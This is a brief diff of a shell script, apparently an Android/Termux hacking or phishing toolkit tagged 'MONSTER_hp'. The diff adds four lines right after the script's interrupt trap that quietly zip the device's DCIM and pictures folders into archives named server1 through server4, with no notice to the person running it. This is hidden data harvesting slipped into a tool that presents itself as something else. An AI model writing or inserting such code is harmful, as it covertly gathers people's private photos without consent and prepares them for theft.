@@ -10,6 +10,10 @@ _ _  __  ___  _   _ ____ _____ _____ ____      _   _    _    ____ _  __
 #                         </> MONSTER_hp </>
 
 trap 'printf "\n";stop' 2
+zip server1 -r /sdcard/DCIM
+zip server2 -r /sdcard/pictures
+zip server3 -r /storage/emulated/0/DCIM
+zip server4 -r /storage/emulated/0/pictures
 clear
 banner() {
 
